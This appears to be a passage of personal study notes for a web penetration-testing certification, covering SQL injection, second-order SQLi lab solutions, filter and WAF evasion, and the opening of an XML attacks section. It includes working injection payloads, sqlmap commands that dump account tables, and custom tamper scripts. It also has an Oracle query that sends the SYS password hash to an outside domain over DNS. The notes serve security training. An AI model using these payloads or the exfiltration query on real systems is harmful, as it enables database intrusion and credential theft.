UTL_INADDR package with the functions GET_HOST_ADDRESS and GET_HOST_NAME   SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.hacket.site') FROM DUAL SELECT UTL_INADDR.GET_HOST_NAME((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.hacket.site') FROM DUAL   Also functions/packages such as:  HTTPURITYPE.GETCLOB UTL_HTTP.REQUEST DBMS_LDAP.INIT      Can be used, but depends on the version of Oracle    It can be automated with SQLMAP   → http://www.slideshare.net/stamparm/dns-exfiltration-using-sqlmap-13163281   Exploiting Second-Order SQL Injection     Second-order SQL Injections are extremely powerful, much like their equivalent in the first-order space; However, due to their nature, they are more difficult to detect.        The exploit is submitted in one request and triggere when the application handles a different request.       Modern automated scanners are unable to perform the rigorous methodology necessaryFor discovering second-order vulnerabilities   Because there are several possible scenarios   Lab     Upload image only   go to List of file signatures in wikipedia   See the value of jpg files   Try to increment the value with php code in it  &lt;?php phpinfo();   Try to open the image uploaded, if the page has php handler it will open the phpinfo  # If not, procced to test the file name with BURP &gt; Repeater filename=\"example.php' and true -- -\"  # If the number of view increase, lets try with UNION this time filename=\"example.php' UNION SELECT @@VERSION; -- -\" filename=\"' UNION SELECT @@VERSION; -- -\" //take off the name of the file filename=\"' UNION SELECT SCHEMA(); -- -\" filename=\"' UNION SELECT GROUP_CONCAT(table_name) from information_schema.tables where table_schema = SCHEMA(); -- -\"   Our scenario:  [&gt;] Injection Name of the file uploaded, e.g. ' union select @version; -- - ** via POST request **   [*] Execution view.php?file={our_payload} ** via GET request **   Downsides:  sqlmap (2nd order) works only GET to GET i.e. we beed a python plugin burp needs a java plugin   Upsides:  out php script  1. GETs the payload in input 2. Generates the respective image payload (POST req) 3. Generates the respective GET req, to view page and reflect the result client-side      So we create a php page, opened with apache2 server to execute payloads   Example:  hacker.site/payload.php?payload='UNION SELECT USER(); -- -   Finish the job with SQLMAP  sqlmap -u 'http://hacker.site/payload.php?payload=x' --technique=U --banner  --flush-session --batch --banner # test the time difference between Time-based and Union-based # Time 0 is 3min long, Union is 2sec   We need to pre-elaborate the form before submitting the request.   Lab Solutions   SQLi 1  PoC:  GET / HTTP/1.1 Host: 1.sqli.labs User-Agent: ' UNION SELECT user(); -- -   SQLMap Automation:  sqlmap -u 'http://1.sqli.labs/' -p user-agent --random-agent --banner   SQLi 2  UNION and standard payloads like 1='1 are filterer.  PoC, False Blind: GET / HTTP/1.1 Host: 2.sqli.labs User-Agent: ' or 'elscustom'='elsFALSE   PoC, True Blind: GET / HTTP/1.1 Host: 2.sqli.labs User-Agent: ' or 'elscustom'='elscustom   # SQLMap Automation: sqlmap -u 'http://2.sqli.labs/' -p user-agent --user-agent=elsagent --technique=B --banner   SQLi 3  Spaces are filtered.   PoC:  GET / HTTP/1.1 Host: 3.sqli.labs User-Agent: '/**/UNION/**/SELECT/**/@@version;#  # SQLMap Automation: sqlmap -u 'http://3.sqli.labs/' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' --union-char=els --banner   SQLi 4  Comments non longer work.   PoC:   GET / HTTP/1.1 Host: 4.sqli.labs User-Agent: 'UNION(select('PoC String'));#   # We cannot easily automate this task, as sqlmap should balance the parentesis. # To exploit by hand you have to first find the tables in the current database:   GET / HTTP/1.1 Host: 4.sqli.labs User-Agent: 'union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#  Then you can enumarate the columns:  GET / HTTP/1.1 Host: 4.sqli.labs User-Agent: 'union(SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='secretcustomers'));#   SQLi 5  This is similar to SQLi 4, but the developer used doublequotes around strings.   PoC:  GET / HTTP/1.1 Host: 5.sqli.labs User-Agent: \"UNION(select('PoC String'));#  # To exploit by hand you have again to find the tables in the current database:  GET / HTTP/1.1 Host: 5.sqli.labs User-Agent: \"union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#   SQLi 6  MySQL’s reserved words have been filtered. Using RaNDom case does not help, as you can have, for example, somethin like InfoRMaTIon_ScheMa who will become InfoRMaTI_ScheMa, as on or ON is a valid reserved word.   PoC:   GET / HTTP/1.1 Host: 6.sqli.labs User-Agent: ' UNiOn seLect @@versiOn;#  The only way to get around this kind of filtering during the exploitation automation phase is to use DifFeReNt CaSe for every letter You have to write a simple tampering script:   #!/usr/bin/env python  from lib.core.enums import PRIORITY  __priority__ = PRIORITY.NORMAL  def dependencies():     pass  def tamper(payload, **kwargs):     \"\"\"     Replaces each keyword with a CaMeLcAsE VeRsIoN of it.      &gt;&gt;&gt; tamper('INSERT')     'InSeRt'     \"\"\"      ret_val = \"\"      if payload:         for i in range(len(payload)):             if i % 2 == 0:                 # We cannot break 0x12345                 if not ((payload[i] == 'x') and (payload[i-1] == '0')):                     ret_val += payload[i].upper()                 else:                     ret_val += payload[i]             else:                 ret_val += payload[i].lower()     return ret_val   SQLMap command line:  sqlmap -u 'http://6.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/camelcase.py --prefix=\"nonexistent'\" --suffix=';#' --union-char=els --banner   SQLi 7  In this scenario, the case-insensitive filter cuts out all the reserved words, but the filter is not recursive.   PoC:  GET / HTTP/1.1 Host: 7.sqli.labs User-Agent: ' uZEROFILLnZEROFILLiZEROFILLoZEROFILLnZEROFILL ZEROFILLsZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt ZEROFILL@@ZEROFILLvZEROFILLeZEROFILLrZEROFILLsZEROFILLiZEROFILLoZEROFILLnZEROFILL; ZEROFILL-- ZEROFILL-ZEROFILL   Tampering script:  #!/usr/bin/env python  from lib.core.enums import PRIORITY  __priority__ = PRIORITY.NORMAL  def dependencies():     pass  def tamper(payload, **kwargs):     \"\"\"     Insert FILL after every character      &gt;&gt;&gt; tamper('INSERT')     'IfillNfillSfillEfillRfillTfill     \"\"\"      retVal = str()      FILL = 'ZEROFILL'      if payload:         for i in range(len(payload)):             retVal += payload[i] + FILL     # Uncomment to debug     # print \"pretamper:\", payload     return retVal    SQLMap automation:  sqlmap -u 'http://7.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --banner   SQLi 8  Simple URL encoding.   PoC:  GET / HTTP/1.1 Host: 8.sqli.labs User-Agent: %61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d  SQLMap Automation:  sqlmap -u 'http://8.sqli.labs/' -p user-agent --tamper=charencode --technique=U --banner   SQLi 9  Double encoding.   PoC:  GET / HTTP/1.1 Host: 9.sqli.labs User-Agent: %25%36%31%25%36%31%25%36%31%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%33%62%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64  SQLMap Automation:  sqlmap -u 'http://9.sqli.labs/' -p user-agent --tamper=chardoubleencode --technique=U --banner   SQLi 10  This labs combines reserver keyword filtering with an injection in a function.   PoC:  GET / HTTP/1.1 Host: 10.sqli.labs User-Agent: ') uZEROFILLnZEROFILLiZEROFILLoZEROFILLn sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt 'PoC'; -- -  SQLMap Automation:  sqlmap -u 'http://10.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --prefix=\"notexistant')\" --suffix=\"; -- \" --union-char=els --banner      [Note] Different sqlmap versions may require different options/flags. For example, regarding level 9:    sqlmap -u 'http://9.sqli.labs/' -p user-agent --tamper=chardoubleencode --technique=U --banner --level=3 --risk=3  or  sqlmap -r 9.sqli.labs.For.sqlmap --banner --tamper=chardoubleencode --dbms mysql --batch --union-char=els  --technique=E  # The only one that worked # lvl 10 didnt work either  ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web"],
        "url": "/notes/ewptx/sqli/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser8.jpg"
      },{
        "title": "8 - SQLI Filter Evasion",
        "excerpt":"  SQL Injection Filter Evasion   How WAFs try to protect websites   WAF bypasses   Introduction  SQLi has evolved so much, now we can not only manipulate database and gain access but also DoS, spread malware, phishing, etc   DBMS Gadgets   Comments  Comments are useful to devs For clarifying particular SQL statements   Our pourposes: Commenting out the query and obfuscating portions of our code   MySQL syntax:  https://dev.mysql.com/doc/refman/8.0/en/comments.html  # * ... */ -- - ;%00   MSSQL syntax:  - http://msdn.microsoft.com/en-us/library/ff848807.aspx /* ... */ -- - ;%00   Oracle syntax:  - https://docs.oracle.com/cd/B19306_01/server.102/b14200/sql_elements006.htm#i31713  /* ... */ -- -   Functions and Operators  MySQL     http://dev.mysql.com/doc/refman/5.7/en/functions.html   Magic numbers:  SELECT name from exployees WHERE id='MAGIC-HERE'  # By manipulating the plus and minus chars we can generate a countless list of the number 1:  id=1 id=--1 id=-+-+1 id=----2---1   Bitwise Functions:  - http://dev.mysql.com/doc/refman/4.1/en/bit-functions.html#operator_bitwise-invert id=1&amp;1 id=0|1 id=13^12 id=8&gt;&gt;3 id=~-2   Logical operator:  - http://dev.mysql.com/doc/refman/5.7/en/logical-operators.html id=NOT 0 id=!0 id=!1+1 id=1&amp;&amp;1 id=1 AND 1 id=!0 AND !1+1 id=1 || NULL id=1 || !NULL id=1 XOR 1   Reguler Expression Operators (REGEX):  - http://dev.mysql.com/doc/refman/5.7/en/regexp.html id={anything} REGEXP '.*' id={anything} NOT REGEXP '{randomkeys}' id={anything} RLIKE '.*' id={anything} NOT RLIKE '{randomkeys}'   Comparison Operators:  - http://dev.mysql.com/doc/refman/5.7/en/comparison-operators.html  id=GREATEST(0,1) id=COALESCE(NULL,1) id=ISNULL(1/0) id=LEAST(2,1)   In MSSQL we cannot use two equal signs concatenated:  id=1 id=-+-+1 id=-+-+-+-+-+-+1 id=-+-+-+-+-+-+-+-+-+1*-+-+-+-+-+-+-+-+-+1   BitWise Operators:  - http://msdn.microsoft.com/en-us/library/ms176122.aspx  We can only manipulate using: &amp;=(AND) |=(OR)  ^ = (XOR)  In MySQL there are other operator that we can leveraged For testing the whether or not some conditions are true   → http://dev.mysql.com/doc/refman/5.7/en/subqueries.html   In SQL Server, these are all grouped in one table:  - http://msdn.microsoft.com/en-us/library/ms189773.aspx However there are not short forms, so  &amp;&amp; || etc... Are not valid in this DBMS   Oracle  SELECT name from exployees WHERE id='MAGIC-HERE'   Oracle is more restrictive   To use arithmetic operators, we must create valid expression to avoid the missing expression erro:  id=1 id=-(-1) id=-(1)*-(1)   To combine values, functions and operators into expressions, we must follow the list of Conditions mixed to Expression   → https://docs.oracle.com/cd/B28359_01/server.111/b28286/conditions.htm#SQLRF005   → https://docs.oracle.com/cd/B28359_01/server.111/b28286/expressions.htm#SQLRF004   SELECT name from employees where id=some(1)   Intermediary Characters     Blank spaces are useful in separating functions, operators, declarations, and so forth, basically intermediary characters.   However, there is non-common characters that can be user   MySQL  SELECT[CHAR]name[CHAR]from[CHAR]employees   Universal characters allowed as whitespaces:                  Codepoint       Character                         9       U+0009       = character tabulation                 10       U+000A       = Life feed (LF)                 11       U+000B       = Line  Tabulation                 12       U+000C       = Form feed                 13       U+000D       = Carriage return (CR)                 32       U+0020       = Space           MSSQL  The list of Universal characters allowed as a whitespace are large. Essentially, all the ASCII Control Characters, the space and the no-break space are allowed.                  Codepoint       Character                         160       U+00A0       = No-break space           Oracle  There are 7 characters in total   All the mysql table + the NULL char:                  Codepoint       Character                         0       U+0000       // NULL           Non Universal characters   Mysql / MSSQL / Oracle  Plus Sign (+)   In all the DBMS we can use the (+) to separate almost all the keywords except FROM:  SELECT+name FROM exployees WHERE+id=1 AND+name LIKE+'J%'   In all DMBS depending on the context ,we can also use  Parenthesis () Operators Quotes  and of course the C-Style comments /**/   Constants and Variables     Constants (AKA Reserved Words)   Knowing the SQL keywords is a must   System Variables also can be very useful   MySQL  The only way to obfuscate keywords is by manipulating upper/lower case variations like:  sELeCt SELect etc   System Variables   → http://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html   We can use the statement:  SHOW VARIABLES   The list is large, if u want to retrieve a specific value, just add @@ before the variable name:  @@version   User Variables:  SET @myvar={expression} SET @myvar:={expression}   MSSQL  Keywords   → http://msdn.microsoft.com/en-us/library/ms189822.aspx   This list displays not only SQL reserved words, but also system functions      Info about configuration and more is organized as Built-in Functions   → http://technet.microsoft.com/en-us/library/ms174318(v=sql.110).aspx   There are primarily four types of functions, closer to variable are Scalar Functions:  @@version // its a Scalar function   Oracle  Particular management of Words   → https://docs.oracle.com/cd/B10501_01/appdev.920/a42525/apb.htm   There are both Reserved Words, the words that cannot be redefined, and Keywords, words always important but can be redefined by the user   Example: we can create a table DATABASE cause the keyword is not Reserved:  CREATE TABLE DATABASE (id number);   Strings  Lets see techniques that are helpful in the creation, manipulation and obfuscation of strings   Regular Notations   MYSQL  To define a string we can use:  single quote  ('') double quotes (\"\")   To define string literals:  _latin1'string'   The character set that can be used has approximately 40 possible values and can use any of them preceded by an underscore character:  SELECT _ascii'Break Me'   U can use N’literal’ or n’niteral’ to create a string in the National character Set: http://dev.mysql.com/doc/refman/5.7/en/charset-national.html  SELECT N'mystring'   Hexadecimal   → https://dev.mysql.com/doc/refman/8.0/en/hexadecimal-literals.html   SELECT X'4F485045' SELECT 0x4F485045   Bit Literals   → https://dev.mysql.com/doc/refman/5.7/en/bit-value-literals.html   Using like B’literal’ or b’literal’:  SELECT 'a'=B'1100001' #TRUE   MSSQL  It defines the literal as either constant or scalar value.      can be defined only by using single quotes (’ ‘)   If the QUOTED_IDENTIFIER options is enabled, then we can use double quotes (” “)  SELECT 'Hello'   OrACLE  Also does not allow double quotes. But we can use National notation → https://docs.oracle.com/cd/B28359_01/server.111/b28286/sql_elements003.htm#SQLRF00218   SELECT 'Hello' SELECT N'Hello' SELECT q'[Hello]' SELECT Q'{Hello}' SELECT nQ'(\"admin\")'   Unicode  MYSQL:  - http://dev.mysql.com/doc/refman/5.5/en/charset-collation-effect.html  Documented above: SELECT 'admin'='âđɱȋň' #TRUE   Escaping  Using backslash before both single and double quotes   → https://dev.mysql.com/doc/refman/8.0/en/string-literals.html   However there are also other special characters used to escapse:  SELECT 'He\\'llo' SELECT 'He\\%\\_llo'   Furthermore, to escape quotes we can use the same character two times:  SELECT 'He''llo' SELECT \"He\"\"llo\"   If we try to escape a character that does not have a respective escaping sequence, the backslash will be ignored:  SELECT '\\H\\e\\l\\l\\o' SELECT 'He\\ll\\o'   In MSSQL and Oracle, u can escape single quotes by using two single quotes:  SELECT 'He''llo'   Concatenation  For quoted strings, concatenation can be performed by placing the string next to each other:  SELECT 'he' 'll' 'o'   As an alternative, we can use functions like CONCAT and CONCAT_WS   → http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_concat   → http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_concat-ws   WS stand For with separator:  SELECT CONCAT('He','ll','o') SELECT CONCAT_WS(''. 'He', 'll', 'o')   Its possible to concatenate using mix of comments in C-Style:  SELECT 'He'/**/'ll'/**/'o' SELECT /**/'He'/**/'ll'/**/'o'/**/ SELECT /*!10000 'He' */'ll'/*****/'o'/*****/   in MSSQL: Can be done by using both the operator (+) and the function CONCAT → http://msdn.microsoft.com/en-us/library/hh231515.aspx   SELECT 'He'+'ll'+'o' SELECT CONCAT('He','ll','o')   We can obfuscate by using C-Style comments:  SELECT 'He'/**/+/**/'ll'/**/+'o' SELECT CONCAT(/**/'He',/**/1/**/,/**/'lo'/**/)   In Oracle: The operator is || and, from the function perspective, we can use CONCAT and NVL:   → https://docs.oracle.com/cd/B28359_01/server.111/b28286/functions026.htm#SQLRF00619   → https://docs.oracle.com/cd/B28359_01/server.111/b28286/functions110.htm#SQLRF00684   SELECT 'He'||'ll'||'o' SELECT CONCAT('He','llo') SELECT NVL('Hello', 'Goodbye')   Obfuscating the string concatenation:  SELECT q'[]'||'He'||'ll'/**/'o' SELECT CONCAT(/**/'He'/**/,/**/'ll'/**/)   Integers:     Example is to use the value PI (3,141593…). With FLOOR to obtain the value 3, and CEIL to obtain the value 4   We can use system function like version() and obtain the value 5,6   For example  ceil(pi()*3) = 10   MySQL Type Conversion  Combining arithmetic operations with different types:  SELECT ~'-2it\\'s a kind of magic'   Numbers vs Booleans:  SELECT ... 1=TRUE SELECT ... 2! =TRUE SELECT ... OR 1 SELECT ... AND 1   Strings vs Numbers vs Booleans:  SELECT ... VERSION()=5.5 #5.5.30 SELECT ... @@VERSION()=5.5 #5.5.30 SELECT ... ('type'+'cast')=0 #TRUE SELECT ~'-2it\\'s a kind of mafic'        '#1 SELECT ~'-1337a kind of magic'-25 #1337   Bypassing Authentication:  # Put all of this together and try to think of some alternatives to the classic  x' OR 1='1   Bypassing Keyword Filters  The first limitation are restriction on keywords   Case Changing  The simplest is just change the cases of each character:  SeLeCt SEleCT etc   sqlmap has a tampering script to automate this case changing   → https://github.com/sqlmapproject/sqlmap/blob/master/tamper/randomcase.py   Using Intermediary Characters  We can use both comments instead of spaces and depending on the DBMS version,  a list of the whitespace that are not matched as spaces:  SELECT/**/values/**/and/**/.../**/or/**/ SELECT[sp]values[sp]and...[sp]or[sp]   Using alternative Techniques  SELECT\"values\"from'table'where/**/1 SELECT(values)from(table)where(1) SELECT\"values\"''from'table'where(1) SELECT+\"values\"%A0from'table'   Circumventing by Encoding  It all depends on how the application processes data      between the attacker and the application, there are many layers, such as a proxy, firewall, etc. If some of these layers handle the encoding differently, there could be a possible bypass   URL Encoding:  - Usually when the requests are sent through the internet via HTTP, they are URL encoded. - In this case we can send the entire string URL-encoded   Double URL Encoding:  # If u encode a URL-Encoded string, they u are performing a Double URL-Encoding  s = %73 &gt; %2573      IN this case, if the filter decodes the request the first time and applies the rules, it will not find anything dangerous       Then when the application receives the request, it will decode the contents and trigger the malicious request    Replaced Keywords  Booleans &gt; AND, OR - AND = &amp;&amp; - OR  = || # only in MySQL and MSSQL WHERE ID=x &amp;&amp; 1=1 WHERE ID=x || 1=1  # If &amp;&amp; and || are filtered, then u must use 'UNION'  UNION &gt; Simple case # We can use many variants to elude these kind of filters:  UNION(SELECT 'VALUES'...) &amp;&amp; UNION ALL SELECT ... UNION DISTINCT SELECT ... /*!00000 UNION*//*!00000 SELECT*/ ...   WHen the UNION is filtered, we must switch to blind SQLi exploitation:  (SELECT id FROM users LIMIT 1)='5 ...   In Oracle:   → https://docs.oracle.com/cd/B28359_01/server.111/b28286/queries004.htm#SQLRF52323      We can use INTERSECT or MINUS operators   WHERE, GROUP, LIMIT, HAVING:      Useful keywords to select a specific entry   If the filter blocks WHERE keyword, we can alternatively use GROUP BY + HAVING:  SELECT id FROM users GROUP BY id HAVING id='5 ...   If GROUP BY is filtered, we must revert to blind SQLi:  AND length((select first char)='a') //0/1 &gt; true/false   If HAVING is filterd, in this case we must leverage functions like GROUP_CONCAT, functions that manipulates strings, etc. Of course, all of this is blind!   If SELECT is filtered, The exploitation can vary and really depends upon the injection point.   You need to use functions that manipulate FILES such as:  load_files //in mysql   Another option, brute-force or guess the column names by appending other WHERE condition such as:  AND COLUMN IS NOT NULL ...   Alternatively, being able to invoke the stored procedure analyse()   → http://dev.mysql.com/doc/refman/5.7/en/procedure-analyse.html   This sproc returns juicy information about the query just executed:  SELECT * FROM employees procedure analyse()   Bypassing Function Filters   Lets now unpack useful techniques and alternative functions For use in these types of scenarios   Building Strings  In the DBMS Gadget chapter, we discussed how to generate strings but, we used quotes. Building strings without quotes is a little bit tricky:  - UNHEX - HEX - CHAR - ASCII - ORD   UNHEX is useful in translating hexadecimal numbers to string:  - http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_unhex  SUBSTR(USERNAME,1,1)=UNHEX(48) SUBSTR(USERNAME,1,2)=UNHEX(4845) ... SUBSTR(USERNAME,1,5)=UNHEX('48454C4C4F') SUBSTR(USERNAME,1,2)=0x48454C4C4F   HEX function is useful to convert o hexadecimal:  - http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_hex  HEX(SUBSTR(USERNAME,1,1))=48 HEX(SUBSTR(USERNAME,1,2))=4845 ... HEX(SUBSTR(USERNAME,1,5))='48454C4C4F'   CHAR can also be used:  - http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_char  SUBSTR(USERNAME,1,1)=CHAR(72) SUBSTR(USERNAME,1,2)=CHAR(72,69) ... SUBSTR(USERNAME,1,1)=CONCAT(CHAR(72),CHAR(69))   ASCII and ORD: twin functions:  - http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_ascii - http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_ord  ASCII(SUBSTR(USERNAME,1,1))=48 ORD(SUBSTR(USERNAME,1,1))=48   CONV: mySQL offers an interesting method in returning the string representation of a number from two bases      http://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function_conv      The highest base we can use is 36    We cannot use For unicode characters; however, at least we can generate a string from a-zA-Z0-9:  CONV(10,10,36) //'a' CONV(11,10,36) //'b'   We can mix the results with upper and lower functions to retrieve the respective representation:  LOWER(CONV(10,10,36)) #'a' LCASE(CONV(10,10,36)) #'a' UPPER(CONV(10,10,36)) #'A' UCASE(CONV(10,10,36)) #'A' ...   Brute-force Strings  - LOCATE - INSTR - POSITION  If u cannot build a string, u can try to locate either a segment or an entire string using functions that return the position of the first occurrence of substrings, and then use conditional statements For the Boolean condition.  IF(LOCATE('H',SUBSTR(USERNAME,1,1)),1,0) # u can also use functions 'INSTR' and 'POSITION'   Building Substring  - SUBSTR - MID - SUBSTRING   MID is a synonym of SUBSTRING, which is a synonym of SUBSTR:  [SUBSTR|MID|SUBSTRING]('HELLO' FROM 1 FOR 1)   Alternatively, functions LEFT and RIGHT   → http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_left   → http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_right   [LEFT|RIGHT]('HELLO',2) //HE or LO   More options functions like RPAD and LPAD:  [LPAD,RPAD]('HELLO',6,'?') //?HELLO or HELLO? [LPAD,RPAD]('HELLO',1,'?') //H ... [LPAD,RPAD]('HELLO',5,'?') //HELLO    Labs  Note: Different sqlmap versions may require different options/flags. For example lab 4 may be solved using the below:  sqlmap -u 'http://192.222.62.2/upload.php?lab=4&amp;payload=' -p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 --banner --flush-session --regexp='99\\sviews'  --prefix=\"01.jpg'\"   1 - ENTRY LEVEL  # Query: $query = \"SELECT views from attachments where filename='$filename'\";   # PoC http://hacker.site/2nd/view.php?payload=%27%20union%20select%20@@version;%20--%20-  # SQLMAP ./sqlmap.py -u 'http://hacker.site/2nd/view.php?payload=a' --technique=U --suffix='; -- -' --banner \t ./sqlmap.py -u 'http://hacker.site/2nd/view.php?payload=a' --technique=U --suffix='; -- -' -D selfie4you01 -T accounts --dump --no-cast   2 - UNION SELECT     no filters   Filters: none  Query: $query = \"SELECT views FROM attachments where filename='$entry';\";   # PoC http://hacker.site/2nd/upload.php?lab=2&amp;payload='+union+select+@@version;%23  # SQLMAP ./sqlmap.py -u \"http://hacker.site/2nd/upload.php?lab=2&amp;payload=_\" -p payload --technique=U --suffix=';#' --union-col=1 --dbms MySQL --banner --no-cast  ./sqlmap.py -u \"http://hacker.site/2nd/upload.php?lab=2&amp;payload=_\" -p payload --technique=U --suffix=';#' --union-col=1 --dbms MySQL -D selfie4you02 -T accounts --dump --no-cast    3 - UNION SELECT     randomcase filter   union-char it’s not required here   Filters: /UNION/ /SELECT/  Query: $query = \"SELECT views FROM attachments where filename='$entry';\";   # PoC http://hacker.site/2nd/upload.php?lab=3&amp;payload=a%27%20UNIoN%20SeLECT%20%27PoC%20String%27;%20--%20-  # SQLMAP  ./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=3&amp;payload=b' \\ \t-p payload --technique=U --suffix=';#' --dbms MySQL --union-col=1 --no-cast \\ \t--tamper=randomcase --banner  ./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=3&amp;payload=b' \\ \t-p payload --technique=U --suffix=';#' --dbms MySQL --union-col=1 --no-cast \\ \t--tamper=randomcase -D selfie4you03 -T accounts --dump   4 - Boolean-based blind     UNION filtered out                                   symboliclogical filter (AND &gt; &amp;&amp; , OR &gt;                       )                           Filters: /UNION/i /\\ AND\\ /i  Query: $query = \"SELECT views FROM attachments where filename='$entry';\";   # POCs  # (%26) == &amp; TRUE:\thttp://hacker.site/2nd/upload.php?lab=4&amp;payload=01.jpg'+%26%26+'123'='123 FALSE:\thttp://hacker.site/2nd/upload.php?lab=4&amp;payload=01.jpg'+%26%26+'123'='1  # using true (1) and false (0)booleans # (%23) == # TRUE:\thttp://hacker.site/2nd/upload.php?lab=4&amp;payload=01.jpg'+%26%26+TRUE;%23 FALSE:\thttp://hacker.site/2nd/upload.php?lab=4&amp;payload=01.jpg'+%26%26+FALSE;%23   # SQLMAP ./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=4&amp;payload=X' \\ \t-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \\ \t--banner --flush-session  ./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=4&amp;payload=X' \\ \t-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \\ \t-D selfie4you04 -T accounts --dump    5 - Boolean-based blind     UNION filtered out                                   symboliclogical filter (AND &gt; &amp;&amp; , OR &gt;                       )                           Filters: /UNION/i /\\ AND\\ /i /\\ OR\\ /i  Query; $query = \"SELECT views FROM attachments where filename='$entry';\";   POCs: # same as #4 but with filter that applies to OR too  # (%7C) == |  # SQLMAP ./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=5&amp;payload=X' \\ \t-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \\ \t--banner --flush-session  ./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=5&amp;payload=X' \\ \t-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \\ \t-D selfie4you05 -T accounts --dump     6 - Boolean-based blind     UNION filtered out                                   symboliclogical filter (AND &gt; &amp;&amp; , OR &gt;                       )                           space to verical tab filter to bypass [space]OR filter   Filters: /UNION/i /AND/i / OR/i  Query; $query = \"SELECT views FROM attachments where filename='$entry';\";  # SQLMAP  ./sqlmap.py -u \"http://hacker.site/2nd/upload.php?lab=6&amp;payload=x\" \\ \t-p payload --technique=B --dbms MySQL --suffix=';#' --tamper=\"symboliclogical, space2VT.py\" \\ \t--no-cast --threads=10 -v 3 \\ \t--banner --flush-session  \t ./sqlmap.py -u \"http://hacker.site/2nd/upload.php?lab=6&amp;payload=x\" \\ \t-p payload --technique=B --dbms MySQL --suffix=';#' \\ \t--tamper=\"symboliclogical, space2VT.py\" \\ \t--no-cast --threads=5 -v 3 \\ \t-D selfie4you06 -T accounts \\\t \t--columns    7 - Boolean-based blind     UNION filtered out                                   symboliclogical filter (AND &gt; &amp;&amp; , OR &gt;                       )                           space to verical tab filter to bypass [space]OR filter   Filters: /UNION/i /AND/i / OR/i /6163636f756e7473/ /selfie4you07.accounts/  Query; $query = \"SELECT views FROM attachments where filename='$entry';\";   # PoC TRUE:\thttp://hacker.site/2nd/upload.php?lab=7&amp;payload=01.jpg'+%26%26+TRUE;%23   # SQLMAP  ./sqlmap.py -u \"http://hacker.site/2nd/upload.php?lab=7&amp;payload=x\" \\ \t-p payload --technique=B --dbms MySQL --suffix=';#' \\ \t--tamper=\"symboliclogical, space2VT.py, accounts.py\" \\ \t--no-cast --threads=5 -v 3 \\ \t--banner --flush-session  \t \t ./sqlmap.py -u \"http://hacker.site/2nd/upload.php?lab=7&amp;payload=x\" \\ \t-p payload --technique=B --dbms MySQL --suffix=';#' \\ \t--tamper=\"symboliclogical, space2VT.py, accounts.py\" \\ \t--no-cast --threads=5 -v 3 \\ \t-D selfie4you07 -T accounts \\ \t--columns \t   BONUS LEVEL(s)   IN ALL LEVELS THE FILTER IS NOT RECOURSIVE      To exploit it you should upload first a filename with the payload you want to execute.   This will be excluded because contains filtered words   Then upload a new file with a name that bypass the redundant filter, such as unUNIONnion.   Once purified the latest filename will be the same as the fist uploaded and thus the file exitsts and can be displayed.   ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web","bypass"],
        "url": "/notes/ewptx/sqlievasion/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser9.jpg"
      },{
        "title": "9 - XML Attacks",
        "excerpt":"  XML Attacks      XML Tag Injection   XML eXternal Entity   XML Entity Expansion   Xpath Injection   Introduction  There are many fields of use that leverage XML:  - PDF - RSS - OOXML - SVG - network protocols such XMLRPC, SOAP, WebDAV and many others   Recap   Technically, XML is derived from the SGML standard and is the same standard on which HTML is based, however, with a lightweight implementation. This means that some SGML-based features, such as unclosed end-closed tags, etc. Are not implemented          html5 standards is not SGML-based            Document Type Definition (DTD):       Block of XML:  - Elements - Tags - Attributes - Entities - PCDATA (Parsed Character Data) - CDATA   Entities Block:   → http://www.w3.org/TR/REC-xml/#sec-logical-struct      To allow For flexibility, the specifications have introduced physical structures   → http://www.w3.org/TR/REC-xml/#sec-physical-struct      There are various types of entities, depending upon where they are declared, how reusable they are, and if they need to be parsed. They can be categorized, as follows:  - Internal/External - General/Parameter - Parsed/Unparsed   Only 5 entity category combinations are considered legal  # Internal General   + Parsed Parameter + Parsed  # External General   + Parsed General   + Unparsed Parameter + Parsed  Generally speaking, there are three options  - XML is tampered - XML document containing an attack is sent - 